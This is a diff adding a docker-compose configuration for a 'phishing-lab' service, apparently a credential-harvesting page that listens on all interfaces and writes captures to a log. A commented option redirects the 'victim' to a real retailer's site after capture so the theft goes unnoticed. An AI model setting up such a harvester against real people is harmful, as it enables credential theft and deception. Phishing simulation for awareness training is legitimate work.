@@ -1,0 +1,17 @@
+services:
+  phishing-lab:
+    build: .
+    container_name: phishing-lab
+    ports:
+      - "443:8443"    # https://localhost — clean URL, no port
+      - "8443:8443"   # https://localhost:8443 / https://<lan-ip>:8443
+    environment:
+      LAB_HOST: 0.0.0.0
+      LAB_CERT: /certs/server.pem
+      LAB_KEY: /certs/server.key
+      # Realistic harvester mode: 302 to the real site after capture,
+      # so the "victim" never notices. Uncomment to try it:
+      # LAB_REDIRECT_URL: https://www.pccomponentes.com/
+    volumes:
+      - ./certs:/certs:ro
+      - ./captured.log:/app/captured.log
